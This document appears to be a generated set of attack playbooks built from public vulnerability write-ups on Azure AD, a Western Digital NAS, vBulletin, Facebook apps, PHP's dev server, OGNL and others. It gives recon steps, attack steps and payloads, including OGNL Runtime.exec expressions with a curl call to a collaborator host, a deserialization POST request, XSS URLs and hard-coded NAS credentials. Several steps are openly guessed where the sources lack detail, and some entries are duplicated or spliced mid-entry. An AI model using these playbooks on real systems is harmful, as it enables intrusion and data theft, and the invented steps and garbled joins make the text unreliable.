meta.title: Azure security — Internal recon leveraging lack of access control

trigger_conditions.when_to_apply: This technique is applicable when the Azure AD setting 'Restrict user ability to access groups features in the Access Panel' is configured to 'No' (permissive), allowing non-privileged users to enumerate group information and associated resources.
prerequisites: Attacker has authenticated as a non-privileged user within the Azure AD tenant.
The Azure AD tenant has the setting 'Restrict user ability to access groups features in the Access Panel' set to 'No' or is not restrictively configured.
applicability_signals: A non-privileged user can access the 'My Groups' section or related group management UIs.
Responses from Azure AD APIs related to group enumeration are not blocked by access control checks.
Group GUIDs are discoverable or guessable.
skip_if: The Azure AD setting 'Restrict user ability to access groups features in the Access Panel' is set to 'Yes' (restrictive), and users are presented with an error page or denied access to group features.
Guest users are unable to access group information by default (this playbook is for internal users).

recon_steps: Step 1: Authenticate to the Azure AD tenant as a non-privileged user.
Step 2: Attempt to access the 'My Groups' feature or any group management interface. Observe if access is restricted or if enumeration is possible.
attack_steps: Step 1: If group enumeration is not explicitly blocked, attempt to iterate through known or predictable group GUIDs.

Step 2: For each discovered group GUID, construct a URL to access group membership and resource details: `https://account.activedirectory.windowsazure.com/r#/manageMembership?objectType=Group&objectId=<GROUP_GUID>`.
Step 3: Analyze the response for details about the group, its members, and associated resources (SharePoint, Teams, Outlook, Yammer).
Step 4: Leverage the provided Python script (or similar logic) to automate the process of iterating through potential group GUIDs and collecting resource URLs into a CSV file.
payloads_or_patterns: https://account.activedirectory.windowsazure.com/r#/manageMembership?objectType=Group&objectId=<GROUP_GUID>
Cookie: <SESSION_TOKEN>
tools_recommended: Burp Suite (for intercepting and modifying requests, analyzing responses)
Custom Python script (as provided in the writeup for automation)
Azure CLI (for exploring group creation and management commands if needed for context)
success_indicators: Successful retrieval of group details, member lists, and URLs for associated resources (SharePoint, Teams, Outlook, Yammer) for groups the authenticated user should not have access to.
Ability to enumerate 'Public' Microsoft 365 groups that were created with default settings.
failure_indicators: Receiving 'Access Denied' or similar error messages when attempting to access group URLs.

The 'Restrict user ability to access groups features in the Access Panel' setting is confirmed to be 'Yes' (restrictive). Pivot: Explore other Azure AD misconfigurations or misconfigurations related to resource access.
No group GUIDs can be discovered or guessed. Pivot: Look for other reconnaissance vectors within Azure AD.

playbooks.impact: An attacker can enumerate internal Azure AD groups and discover associated resources like SharePoint sites, Teams, and Outlook group email addresses. This information can be used to understand the internal structure of an organization, identify sensitive resources, and potentially gain access to collaboration tools or email communications by joining public groups. This aids in the internal reconnaissance phase for further attacks.
playbooks.key_lesson: Always verify Azure AD tenant-wide settings related to user access to group features, as permissive configurations can lead to broad information disclosure and internal reconnaissance opportunities for unauthenticated or low-privileged users.

meta.title: WEEKEND DESTROYER - RCE in Western Digital PR4100 NAS

target_profile.technology: Western Digital My Cloud Pro Series PR4100 NAS

trigger_conditions.when_to_apply: The target is a Western Digital My Cloud Pro Series PR4100 NAS running firmware versions up to and including 2.40.157, and the attacker is unauthenticated.
prerequisites: The target device is accessible over the local network.
applicability_signals: The presence of the REST API endpoint at /api/2.1/rest/
Apache httpd server running on ports 80 and 443.
skip_if: Firmware version is above 2.40.157.
Network access to the device is blocked by a firewall.

recon_steps: Step 1: Identify the target device by scanning the local network for open ports 80 and 443 and looking for HTTP responses indicative of Western Digital NAS devices.
Step 2: Confirm the presence of the REST API at /api/2.1/rest/ by sending an unauthenticated GET request.
attack_steps: Step 1: Exploit CVE-2021-36224 by using the hard-coded credentials for the 'nobody' user (empty password) to authenticate to the REST API. The writeup does not specify which endpoint is used for authentication, so assume a general authentication endpoint or a sensitive endpoint that allows authentication bypass.

Step 2: Exploit CVE-2021-36225 by initiating a firmware upgrade as a low-privilege user. The writeup states that the firmware upgrade can be initiated by a low privilege user, implying an endpoint accessible without admin credentials after initial authentication.
Step 3: Exploit CVE-2021-36226 by crafting a malicious firmware image. Since there is no cryptographic verification, the device will accept and install the malicious firmware.
Step 4: Achieve RCE as root by executing commands within the malicious firmware. The writeup implies this is possible by creating a persistent backdoor.
payloads_or_patterns: Credentials for 'nobody' user: username='nobody', password=''
Malicious firmware image (specific creation details are not provided in the writeup, but it would need to contain commands to establish a backdoor).
tools_recommended: Nmap for network scanning.
Burp Suite for intercepting and manipulating HTTP requests to the REST API.
A custom script or tool to craft and upload the malicious firmware image.
success_indicators: Successful authentication to the REST API using the hard-coded credentials.
The device accepting and initiating the firmware upgrade process.
A persistent backdoor is established, allowing remote command execution as root (e.g., by checking for a newly created file or a reverse shell connection).
failure_indicators: Authentication fails with the 'nobody' credentials (indicates potential patching or different authentication mechanism). Try other hard-coded credentials if available.
Firmware upgrade is rejected with an error message (indicates potential input validation or signature checks were added).
No backdoor is established after the firmware upgrade (indicates failure to achieve RCE). Consider other RCE vectors or privilege escalation if possible.

playbooks.impact: Remote code execution as root on the Western Digital PR4100 NAS device, allowing for full control of the device, data access, and the creation of persistent backdoors.
playbooks.key_lesson: Always investigate hard-coded credentials and assess the security of firmware update mechanisms, as they can be critical entry points for RCE.

meta.title: WEEKEND DESTROYER - RCE in Western Digital PR4100 NAS

target_profile.technology: Western Digital My Cloud Pro Series PR4100 NAS
tech_stack_fingerprints: Apache httpd running on port 80 or 443

trigger_conditions.when_to_apply: When a Western Digital My Cloud Pro Series PR4100 NAS device is accessible on the local network and running firmware version 2.40.157 or earlier.
prerequisites: Target device is a Western Digital My Cloud Pro Series PR4100 NAS.

Device is accessible on the local network.

skip_if: Firmware version is newer than 2.40.157.

Step 2: Send a GET request to the /api/2.1/rest/ endpoint on port 80 or 443 to confirm its existence and response.
attack_steps: Step 1: Use the hardcoded credentials (e.g., 'nobody' with an empty password) to authenticate to the REST API. (Although the writeup mentions 'nobody' and 'squeezecenter' having fixed passwords, it focuses on the exploit chain rather than the initial authentication method. The exploit chain implies that unauthenticated access to certain API endpoints is possible, leading to RCE.)

payloads_or_patterns: Hardcoded credentials (example from writeup, though exploitation path implies unauthenticated access): User: 'nobody', Password: ''
Malicious firmware payload (conceptual): A custom firmware image designed to execute commands (e.g., a reverse shell) upon installation.
tools_recommended: Nmap: For port scanning.
Burp Suite: To intercept and manipulate API requests.

playbooks.impact: Remote Code Execution as root on the Western Digital PR4100 NAS, allowing full control of the device, data exfiltration, creation of persistent backdoors, and potential pivoting to other devices on the network.
playbooks.key_lesson: Always investigate API endpoints for functionality that allows for file uploads or system configuration changes, especially firmware upgrades, as they can be a vector for RCE if not properly secured and validated.

meta.title: Java JMX's Exploitation Problems and Resolutions

Java applications running without explicit security restrictions on JMX
skip_if: JMX endpoints are firewalled or require specific authentication credentials that are not publicly known.

Exploit vulnerable MBeans to upload and execute arbitrary code.

Example: Using `jmxterm` to invoke methods on MBeans that can trigger code execution.
tools_recommended: Nmap (with jmx scripts)
jmxterm
Jolokia agent (for HTTP bridge to JMX)
Metasploit Framework (for JMX-related modules)

Establishing a reverse shell or obtaining sensitive information through JMX interactions.

tools_recommended: Burp Suite or OWASP ZAP: Intercept traffic and analyze HTML source.
success_indicators: Discovery of specific version numbers, build dates, or other internal system details within the login page's HTML source.
failure_indicators: No version information or sensitive details found in the HTML source. The application might be hardened or the version is not exposed client-side. No pivot suggested as the disclosure is passive.

playbooks.impact: Attacker can gain knowledge of the specific version of CentreStack being used, which can aid in finding publicly known exploits or vulnerabilities associated with that version. This facilitates targeted attacks.
playbooks.key_lesson: Always inspect the HTML source code of login pages and other web interfaces for version information or other client-side disclosures that can inform further reconnaissance.

meta.title: RCE in Avaya Aura Device Services

trigger_conditions.when_to_apply: This playbook applies when an attacker has access to the Avaya Aura Device Services installation binary and can extract its contents without executing the installation script.
prerequisites: Attacker can download or otherwise obtain the AADS installation binary file.
applicability_signals: The target software is Avaya Aura Device Services.
The installation file is a Makeself archive (e.g., 'aads-X.X.X.X.X.bin').
skip_if: The installation script cannot be bypassed or extracted without execution.
The target environment does not use Avaya Aura Device Services.

recon_steps: Step 1: Identify the Avaya Aura Device Services installation binary file (e.g., aads-8.0.0.0.268.bin).
Step 2: Use a tool like `file` to confirm the file is a Makeself archive.
attack_steps: Step 1: Extract the contents of the Makeself archive using the `--noexec` and `--target` flags to prevent script execution. Example: `./aads-8.0.0.0.268.bin --noexec --target /path/to/extract`
Step 2: Analyze the extracted files for scripts, configuration files, and binaries that might contain vulnerabilities or allow for further manipulation.

Step 3: (Hypothetical, based on writeup's lack of exploitation detail) Identify potential vulnerabilities within the extracted components, such as insecure command execution, vulnerable third-party libraries, or hardcoded credentials. The writeup does not detail the specific RCE vector beyond extraction.
payloads_or_patterns: ./<aads-installation-binary> --noexec --target <output_directory>
tools_recommended: Makeself (for archive manipulation)
File command (for file type identification)
Hex editor (for examining binary structures)
Disassembler/Decompiler (for analyzing binaries)
success_indicators: Successful extraction of the AADS installation binary contents without triggering the installation script.
Identification of exploitable code or configurations within the extracted files.
failure_indicators: The `--noexec` flag is not supported or is ignored by the Makeself archive, leading to script execution and cleanup.
The extracted files do not contain any apparent vulnerabilities or entry points for RCE.

playbooks.impact: Remote Code Execution on the target system, allowing an attacker to run arbitrary commands with the privileges of the installed AADS service.
playbooks.key_lesson: When analyzing software installers, attempt to extract their contents without executing the installation scripts using flags like `--noexec` to discover embedded components and potential vulnerabilities before the software is actively deployed.

meta.title: Reversing UK mobile rail tickets

tech_stack_fingerprints: APK file for an Android application

trigger_conditions.when_to_apply: When analyzing mobile ticketing systems that use Aztec barcodes and where the underlying decoding mechanism or data format is unknown. This playbook is applicable when a specific app is identified as responsible for decoding these barcodes.
prerequisites: The target system uses Aztec barcodes for mobile tickets.
An Android application (e.g., Masabi JustRide Inspect) is identified as responsible for decoding these barcodes.
applicability_signals: Target mobile tickets are observed to be Aztec barcodes.
Research or external information points to a specific mobile application (like JustRide Inspect) that decodes these tickets.
The barcode data does not conform to known public standards (like UIC 918.3).
skip_if: Barcode format is easily decodable with standard libraries and reveals no sensitive information.
No relevant mobile application can be identified or acquired.

recon_steps: Step 1: Obtain an Android APK for the 'JustRide Inspect' application from a less official website.
Step 2: Install the APK on an Android Virtual Device (AVD) for safer analysis.
Step 3: Run the application and attempt to scan or interact with sample mobile rail ticket barcodes.
attack_steps: Step 1: Attempt to scan a mobile rail ticket barcode using the installed 'JustRide Inspect' app.
Step 2: If direct scanning fails or requires specific credentials (e.g., Train Operating Company login), proceed to decompiling the APK.
Step 3: Analyze the decompiled code, focusing on libraries or functions related to barcode decoding and data parsing.
Step 4: Identify the data format and any encryption or encoding schemes used within the Aztec barcode.
Step 5: If sensitive data is identified, attempt to extract and interpret it based on the reverse-engineered format.
payloads_or_patterns: N/A (This playbook focuses on reverse engineering rather than direct payload injection)
tools_recommended: Android Virtual Device (AVD) or emulator
APK analysis tools (e.g., JADX, Ghidra)
ZXing (for initial barcode decoding attempts)
success_indicators: Successful decoding of the Aztec barcode to reveal ticket details (e.g., passenger name, travel details, ticket ID).
Identification of encryption keys or algorithms used for ticket data.
Extraction of sensitive personal or travel information from the barcode data.
failure_indicators: Application crashes or fails to process barcodes.
Decompiled code is heavily obfuscated, making analysis difficult.
Barcode data appears to be purely random or uninterpretable even after analysis.
App requires valid, inaccessible credentials (e.g., TOC login) and decompilation does not reveal a bypass.

playbooks.impact: Disclosure of sensitive passenger information (names, travel details, ticket validity) embedded within mobile rail tickets. This could lead to privacy violations and potential misuse of personal data.
playbooks.key_lesson: When analyzing proprietary mobile ticketing systems, reverse engineer the associated decoding application to understand the data format and identify potential data leakage vulnerabilities.

meta.title: Remote Command Execution in binwalk

tech_stack_fingerprints: binwalk is a command-line tool for analyzing, reverse engineering, and extracting firmware images.

trigger_conditions.when_to_apply: When an attacker can entice a user to open a malicious file with binwalk using the extract mode (-e option). This is particularly relevant for users analyzing firmware images from untrusted sources.
prerequisites: The target system must have binwalk installed and vulnerable (versions 2.1.2b through 2.3.3).
applicability_signals: The presence of the `binwalk` executable on the target system.
The use of the `-e` or `--extract` flag with binwalk.
skip_if: The target system is running a patched version of binwalk.
The user is unlikely to be enticed to open untrusted files with binwalk.

recon_steps: Step 1: Identify if binwalk is installed on the target system by attempting to run `binwalk --version`.
Step 2: Confirm the installed version of binwalk. If it falls within the vulnerable range (2.1.2b-2.3.3), proceed with exploitation.
attack_steps: Step 1: Craft a malicious file that exploits the path traversal vulnerability in the PFS filesystem extractor. This involves creating a file with a crafted PFS structure that includes directory traversal sequences (e.g., `../../`).

Step 2: Craft a second malicious file that leverages binwalk's plugin system to achieve arbitrary code execution. This might involve placing a malicious Python script in a location that binwalk will load as a plugin.
Step 3: Entice the user to open the malicious PFS file using binwalk with the extract option: `binwalk -e <malicious_pfs_file>`.
payloads_or_patterns: Craft a PFS file with path traversal sequences (e.g., `../`) to write arbitrary files to sensitive locations.
Craft a plugin that executes arbitrary commands when loaded by binwalk.
tools_recommended: Custom script for crafting malicious PFS files
Custom script for creating malicious binwalk plugins
success_indicators: Arbitrary file creation on the target system outside the intended extraction directory.
Execution of arbitrary commands on the target system (e.g., a reverse shell connection is established).
failure_indicators: Binwalk exits with an error indicating it cannot extract the file.
No arbitrary files are created, and no commands are executed. This might indicate the PFS structure is incorrect or binwalk has internal defenses.
A 403 Forbidden error if the system has a WAF blocking suspicious file operations.

playbooks.impact: Remote attackers can execute arbitrary code on affected installations of binwalk. This could lead to complete system compromise, data exfiltration, or further malicious activities.
playbooks.key_lesson: When analyzing untrusted archive or filesystem formats, always validate and sanitize file paths during extraction to prevent path traversal vulnerabilities. Also, be aware of how plugin systems can be abused for remote code execution.

meta.title: Unserializable, But Unreachable: Remote Code Execution On vBulletin

trigger_conditions.when_to_apply: This technique is applicable when vBulletin is running a version less than or equal to 5.6.9 and allows unauthenticated users to register or submit user profile data that is processed by the vB_DataManager_User class.
prerequisites: Target vBulletin version is <= 5.6.9.
applicability_signals: The presence of the `/ajax/api/user/save` endpoint.
The ability to submit user registration data without authentication.
The `searchprefs` field is processed by `vB_DataManager_User::verify_serialized()`.
skip_if: vBulletin version is patched (>= 5.6.9 PL1, 5.6.8 PL1, 5.6.7 PL1).
The `searchprefs` field is not vulnerable to deserialization.

recon_steps: Step 1: Identify target vBulletin version by checking for version-specific files or headers, or by analyzing client-side JavaScript for version information.
Step 2: Attempt to access the `/ajax/api/user/save` endpoint without authentication to confirm its availability and functionality for user updates/registrations.
attack_steps: Step 1: Send a POST request to the `/ajax/api/user/save` endpoint.
Step 2: Include `securitytoken=guest`, `userid=0`, and provide necessary user details like `user[email]`, `user[username]`, `password`, and `user[password]`.

Step 3: Crucially, set the `user[searchprefs]` parameter to a serialized PHP object that triggers a gadget chain leading to RCE. For example, `O:12:"PDOStatement":0:{}` as a starting point, to be replaced with a working gadget chain if discovered.

Step 4: Analyze the response for any indication of successful deserialization or execution of code. Due to the `vB_Trait_NoSerialize`, direct RCE via common PHP deserialization gadgets may be blocked. Further research into unpatched Monolog versions or custom gadget chains would be required for exploitation.
payloads_or_patterns:
POST /ajax/api/user/save HTTP/1.1
Host: <TARGET_URL>
Content-Type: application/x-www-form-urlencoded

securitytoken=guest&options=&adminoptions=&userfield=&userid=0&user[email]=pown@pown.net&user[username]=toto&password=password&user[password]=password&user[searchprefs]=O:12:"PDOStatement":0:{}
tools_recommended: Burp Suite: To craft and send the POST request, and to intercept and analyze responses.
PHPGGC: To research and generate potential deserialization gadgets (though unlikely to work directly due to vB_Trait_NoSerialize).
success_indicators: A successful RCE would manifest as the execution of arbitrary commands on the server. However, due to the `vB_Trait_NoSerialize`, direct observable success indicators for standard PHP deserialization RCE are unlikely. The writeup implies difficulty in achieving RCE despite the deserialization vulnerability.

A successful deserialization that does *not* immediately crash the application might be indicated by a successful user registration or profile update response (e.g., 2xx status code) without explicit error messages related to serialization.
failure_indicators: Any response that indicates a validation error or a thrown exception related to serialization (e.g., 'Serialization not supported') means the gadget chain is not working or is blocked by vBulletin's internal mechanisms.
A 400 or 500-level error response, especially if it directly mentions issues with the `searchprefs` parameter or deserialization process.

playbooks.impact: Remote Code Execution (RCE) on the vBulletin server, allowing an attacker to execute arbitrary commands with the privileges of the web server process. This could lead to full server compromise.
playbooks.key_lesson: Always investigate the `unserialize()` function calls, especially within user-controlled input fields and validation routines, as they can lead to arbitrary deserialization vulnerabilities and potential RCE, even if the target framework employs some anti-serialization measures.

meta.title: The 100+ Million Person Data Disclosure

tech_stack_fingerprints: Forms for personal information and credit card details

trigger_conditions.when_to_apply: When an authenticated user can access an order status or application details page that includes a unique identifier in the URL, and this identifier appears to be sequential or guessable.
prerequisites: Attacker must have an authenticated session with the target application.
applicability_signals: The presence of a URL parameter containing a numeric identifier (e.g., `id=105608983`) in an application's order status or print page.
The ability to access personal data through a link with a numeric ID.
skip_if: URL parameters are obfuscated or non-sequential (e.g., UUIDs without a known enumeration pattern).
Application directly checks ownership of the requested data and returns an error before displaying information for other users.

recon_steps: Step 1: Authenticate to the target application and navigate to the order status or application details page.
Step 2: Observe the URL for parameters that appear to be unique identifiers for the application or user data (e.g., order ID, application ID).
attack_steps: Step 1: Identify a numeric identifier in the URL of a page displaying personal information (e.g., `https://threat.dev/app/printApplication?id=105608983`).
Step 2: Systematically change the numeric identifier in the URL to adjacent values (e.g., `id=105608982`, `id=105608984`).
Step 3: Observe the response for each changed identifier. If the response contains data belonging to another user, an IDOR vulnerability is confirmed.
payloads_or_patterns: https://<TARGET_URL>/app/printApplication?id=<TARGET_URL_ID_ADJACENT>
tools_recommended: Burp Suite Intruder: Configure to iterate through numeric sequences around the identified ID.
Manual Browser Testing: For incremental changes and initial identification.
success_indicators: The application returns personal information of another user when a different numeric ID is provided in the request URL.
HTTP 200 OK status code with PII of other users in the response body.
failure_indicators: Receiving an error message (e.g., 'Invalid ID', 'Not Found', 'Access Denied') for all attempted ID changes.
Receiving a 403 Forbidden response for all attempted ID changes.
If subsequent IDs are non-numeric or non-sequential and cannot be easily enumerated, consider alternative ID enumeration techniques if applicable.

playbooks.impact: Disclosure of sensitive personal information (PII) for over 100 million individuals, including passport details, personal questions, photos, and potentially credit card numbers if stored insecurely.
playbooks.key_lesson: Always test sequential or guessable numeric identifiers in URL parameters by attempting to access resources belonging to other authenticated users.

meta.title: DOM-XSS in Instant Games due to improper verification of supplied URLs

affected_components: Instant Games platform, specifically URL handling within game contexts
tech_stack_fingerprints: Presence of 'Instant Games' features on Facebook

trigger_conditions.when_to_apply: When the Instant Games platform or related components accept and process URLs from external sources without proper origin validation.
prerequisites: Attacker must be able to provide a URL to the target application.
applicability_signals: Endpoints that handle or display external URLs within the Instant Games environment.
skip_if: If all incoming URLs are strictly validated against an allowlist or are properly sanitized before rendering.

recon_steps: Step 1: Identify Facebook Instant Games or features that handle external URLs.
Step 2: Analyze how these URLs are processed and rendered within the game's context. Look for JavaScript that directly manipulates DOM elements with URL parameters.
attack_steps: Step 1: Craft a malicious URL that leverages a DOM XSS vulnerability. This might involve injecting script tags or using JavaScript's `eval()` or `innerHTML` functions with user-controlled input.
Step 2: Provide this malicious URL to the target. The exact method depends on how URLs are shared or loaded within Instant Games (e.g., through game invites, shared links, or in-game browsing).
Step 3: Observe if the injected script executes within the context of the Facebook domain.
payloads_or_patterns: Example payload structure for DOM XSS via URL manipulation: <TARGET_URL>#<script>alert(document.domain)</script>
Payloads targeting specific vulnerable JavaScript functions like `eval()`, `document.write()`, `innerHTML`
tools_recommended: Burp Suite Proxy: To intercept and modify requests/responses related to URL handling.
Browser Developer Tools: For inspecting DOM manipulation and JavaScript execution.
success_indicators: Execution of JavaScript code within the browser's console (e.g., `alert(document.domain)` showing 'facebook.com').
Redirection to a malicious site or execution of any unintended JavaScript behavior.
failure_indicators: The URL is blocked or sanitized, resulting in no script execution (e.g., HTML tags are stripped or encoded). Pivot to fuzzing URL parameters with different encoding schemes or different types of XSS payloads.
The script executes, but not in the context of facebook.com (e.g., in an iframe with a different origin).

playbooks.impact: Execution of arbitrary JavaScript in the context of the Facebook domain, leading to potential session hijacking, account takeover, data exfiltration, or further exploitation of Facebook's platform.
playbooks.key_lesson: Always strictly validate and sanitize all user-supplied URLs before rendering them in the DOM, ensuring no script execution is possible.

meta.title: Account Takeover in Canvas Apps served in Comet due to failure in Cross-Window-Message Origin validation

trigger_conditions.when_to_apply: When a Facebook Canvas App is served within the Comet environment and the origin validation for `window.postMessage` is flawed.
prerequisites: Attacker must be able to craft a malicious web page that can communicate with a vulnerable Canvas App.
applicability_signals: Canvas Apps are observed to be using `window.postMessage` for inter-window communication.
Specific error messages or behaviors indicate potential origin validation issues during `postMessage` handling.
skip_if: All `postMessage` calls strictly validate the origin and do not allow cross-origin communication.
The Canvas App does not utilize `window.postMessage`.

recon_steps: Step 1: Identify Canvas Apps within the Facebook ecosystem that are served via Comet.
Step 2: Analyze the JavaScript code of these Canvas Apps to find instances of `window.postMessage` usage and understand the communication flow.
Step 3: Investigate how the origin of incoming `postMessage` events is validated.
attack_steps: Step 1: Craft a malicious HTML page hosted on an attacker-controlled domain.
Step 2: Within the malicious page, use `window.open` or an iframe to open or load the target Facebook Canvas App.
Step 3: Use `window.postMessage` to send a carefully crafted message to the Canvas App from the malicious origin.
Step 4: If the Canvas App fails to validate the origin of the `postMessage`, it might process commands or data from the malicious origin.
Step 5: Exploit this to trigger actions within the Canvas App that can lead to account takeover, such as stealing session tokens or redirecting the user to a malicious page.
payloads_or_patterns: Example malicious JavaScript to send a message: `window.parent.postMessage('{\"cmd\": \"some_command\"}', '*');` (The target value should be a specific origin if '*' is not vulnerable, or an empty string, or a wildcard if the validation is weak.)
Analyze the Canvas App's response to various `postMessage` payloads, including malformed ones or those with unexpected command names.
tools_recommended: Burp Suite: To intercept and modify requests/responses, and observe communication patterns.
Browser Developer Tools: To debug JavaScript, inspect DOM, and analyze `postMessage` interactions.
Custom JavaScript: To automate the sending of `postMessage` events and test various payloads.
success_indicators: The Canvas App performs an action based on the attacker-sent `postMessage` that it should not have, e.g., executing a sensitive function, leaking user information, or redirecting the user to an attacker-controlled URL.
Observing sensitive data being transmitted from the Canvas App to the attacker's origin.
failure_indicators: The Canvas App ignores `postMessage` events from the attacker's origin or responds with an error indicating origin mismatch (e.g., 403 or a specific error message in the console).
If the Canvas App requires specific data formats or authentication tokens within the `postMessage` that the attacker cannot provide.

playbooks.impact: Attacker can achieve account takeover by exploiting the trust relationship between the Canvas App and the user's authenticated Facebook session, potentially leading to unauthorized actions, data theft, or redirection to phishing sites.
playbooks.key_lesson: Always strictly validate the origin of `window.postMessage` events in web applications, especially when dealing with sensitive user data or actions. Avoid using wildcard origins ('*') for sensitive communication.

meta.title: Account takeover of Facebook/Oculus accounts due to First-Party access_token stealing

trigger_conditions.when_to_apply: When an application uses first-party OAuth flows and potentially exposes access tokens in a way that they can be intercepted or stolen by a malicious third party.
prerequisites: Attacker can trick a victim into visiting a malicious URL or interacting with a malicious element.
The target application (Facebook/Oculus) uses OAuth 2.0 for authenticating users with third-party applications.
applicability_signals: Observation of OAuth authorization redirects involving Facebook or Oculus.
Applications requesting access to Facebook or Oculus user data.
skip_if: The OAuth flow strictly enforces SameSite cookies or other robust mechanisms preventing token leakage.
No observable mechanism exists for redirecting authenticated users to attacker-controlled endpoints without explicit user consent and confirmation.
Access tokens are not exposed in client-side JavaScript or URL parameters after authorization.

recon_steps: Step 1: Analyze the OAuth 2.0 flow used by Facebook and Oculus for third-party applications. Identify the endpoints involved in authorization and token exchange.
Step 2: Look for how access tokens are handled and transmitted after a user grants permissions to a third-party application. Pay close attention to redirects and client-side JavaScript.
attack_steps: Step 1: Craft a malicious link that mimics a legitimate OAuth authorization request or a redirect after authorization.
Step 2: If the platform allows it, attempt to exploit a vulnerability that causes the access token to be leaked to an attacker-controlled server during the redirect or via client-side scripting.
Step 3: Once the access token is stolen, use it to impersonate the victim and gain unauthorized access to their Facebook or Oculus account.
Step 4: Test functionalities within the victim's account to confirm successful takeover and assess the scope of impact.
payloads_or_patterns: Insufficient detail in writeup. Potential patterns involve crafted OAuth redirect URLs or XSS payloads within redirected pages.
tools_recommended: Burp Suite: To intercept and analyze OAuth requests and responses.
Custom scripts: To automate the crafting and delivery of malicious links.
success_indicators: Ability to access the victim's Facebook or Oculus account without their credentials using the stolen access token.
Performing actions on behalf of the victim within their account.
failure_indicators: Access token is not leaked or is invalidated upon interception.
OAuth flow prevents redirection to attacker-controlled domains.
400 Bad Request or other error responses when attempting to use a stolen token.
Pivot suggestion: If token stealing is not feasible, investigate other OAuth-related vulnerabilities like open redirects in callback URLs or client_id manipulation.

playbooks.impact: Full account takeover of Facebook and/or Oculus accounts, leading to potential data breaches, unauthorized actions, and further compromise.
playbooks.key_lesson: Always scrutinize OAuth 2.0 implementations for potential token leakage vectors, especially during redirects and client-side handling of sensitive credentials.

meta.title: PHP Development Server <= 7.4.21 - Remote Source Disclosure

trigger_conditions.when_to_apply: When the target is running a vulnerable version of the PHP Development Server (<= 7.4.21) and an attacker can send crafted HTTP requests.
prerequisites: The target must be running PHP Development Server version 7.4.21 or earlier.
The attacker must be able to send HTTP requests to the PHP Development Server.
applicability_signals: The server responds to HTTP requests.
The server is identified as being a PHP Development Server (often through headers or observed behavior).
skip_if: The PHP server is running version 7.4.22 or later.
The server is not a PHP Development Server.
The server immediately returns 404 or other errors for all requests without processing them as PHP scripts.

recon_steps: Step 1: Identify if the target is running a web server. Send a basic HTTP GET request to a known file like /index.php or /test.html.

Step 2: Analyze the response headers and content to identify if it's a PHP Development Server. Look for specific server banners or characteristic error messages. This can also be done by observing the response to a request for a `.php` file that should execute server-side logic.
attack_steps: Step 1: Send an HTTP request with a PHP file as the target path, e.g., `GET /your_file.php HTTP/1.1`. Ensure the `Host` header is present.

Step 2: Immediately follow up with a second, separate HTTP request to the root of the server, e.g., `GET / HTTP/1.1`. This second request, when pipelined or sent shortly after the first, triggers the vulnerability.
Step 3: Observe the server's response to the second request. If the vulnerability is present, the server will return the source code of the `your_file.php` file instead of executing it.
payloads_or_patterns:
Request 1: GET /<FILENAME>.php HTTP/1.1
Host: <TARGET_URL>


Request 2: GET / HTTP/1.1
tools_recommended: curl: To send crafted HTTP requests and observe responses.
Burp Suite: To intercept and modify HTTP requests, especially for pipelining or precise timing of requests.
success_indicators: The response to the second HTTP request contains the source code of the PHP file requested in the first request.
The response body is not the expected output of executing the PHP script, but rather the literal PHP code.
failure_indicators: The server returns the expected output of the PHP script for the second request (indicating it was executed as intended).
The server returns a 404 Not Found for the second request.
The server returns a 400 Bad Request for the second request, indicating an issue with the request itself rather than the vulnerability trigger.
If the first request itself returns the source code instead of the second request, it suggests a different type of vulnerability or misconfiguration.

playbooks.impact: Disclosure of sensitive source code, including logic, credentials, or other proprietary information that could lead to further exploitation.
playbooks.key_lesson: When testing PHP Development Server, send a request to a PHP file and immediately follow it with a request to the root ('/') to trigger source code disclosure.

meta.title: Bypassing OGNL sandboxes for fun and charities

tech_stack_fingerprints: Apache Struts framework (implied by OGNL context)

trigger_conditions.when_to_apply: When a web application uses Apache Struts and allows for unauthenticated or authenticated user-controlled input to be evaluated as OGNL expressions.
prerequisites: The target application must be using Apache Struts with a vulnerable configuration.
An input parameter must be present that is vulnerable to OGNL injection.
applicability_signals: Presence of Apache Struts in the technology stack.
Input parameters that are processed by OGNL.
skip_if: The OGNL sandbox is properly configured and prevents arbitrary code execution.
Input parameters are strictly validated and do not allow for special characters required for OGNL expression construction.

recon_steps: Identify Apache Struts usage via HTTP headers (e.g., 'Server: Apache-Coyote/1.1', 'X-Powered-By: Servlet 3.1; ISPConfig').
Look for common Struts endpoints and parameter patterns.
attack_steps: Step 1: Send a request to an endpoint that accepts user-controlled input, embedding a malicious OGNL expression.
Step 2: Craft OGNL expressions to bypass sandbox restrictions, aiming to execute arbitrary code.
Step 3: Monitor for unexpected behavior or outbound network connections indicative of code execution.
payloads_or_patterns: %{(#_='multipart/form-data').(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].setHeader('X-Payload-Executed', T(java.lang.Runtime).getRuntime().exec('whoami')))}

%{(#_='multipart/form-data').(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].setHeader('X-Command-Output', T(java.lang.String).join('', T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('command.txt')))))}
%{(#_='multipart/form-data').(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].sendError(500, T(java.lang.Runtime).getRuntime().exec('curl <YOUR_COLLABORATOR_URL>')))}
tools_recommended: Burp Suite: For intercepting and modifying requests, and for automated scanning.
OWASP ZAP: For similar functionalities as Burp Suite.
Custom scripts (Python, Go): To automate payload generation and testing of various OGNL bypass techniques.
success_indicators: Receiving an HTTP response header with custom content (e.g., 'X-Payload-Executed', 'X-Command-Output').
Receiving an outbound connection on a collaborator server (e.g., Burp Collaborator, interact.sh) from the target.
Error messages or response content indicating successful execution of commands or arbitrary code.
failure_indicators: Receiving a 400 Bad Request or 404 Not Found response without any custom headers or outbound connections.
The OGNL sandbox successfully prevents code execution, leading to generic error messages or no observable impact.

playbooks.impact: Remote Code Execution (RCE) on the target server, allowing an attacker to run arbitrary commands, access sensitive data, or take full control of the system.
playbooks.key_lesson: When dealing with frameworks like Apache Struts that involve expression evaluation (e.g., OGNL), investigate sandbox bypass techniques to achieve Remote Code Execution, especially if input validation is insufficient.

meta.title: Ransacking your password reset tokens

tech_stack_fingerprints: Presence of Ransack gem in Ruby on Rails applications, 'q' GET parameter used for search queries

trigger_conditions.when_to_apply: When a web application uses the Ransack gem and exposes search functionality to unauthenticated users without proper attribute whitelisting.
prerequisites: The target application must use the Ransack gem.
A search or filtering feature must be exposed to end-users.
The Ransack query parameters (typically under the 'q' GET parameter) must not be restricted to an allow-list of searchable attributes.
applicability_signals: The presence of a '/search' or similar endpoint that accepts GET parameters.
Inspection of network traffic reveals a 'q' parameter containing nested hash-like structures (e.g., q[attribute_cont]=value).
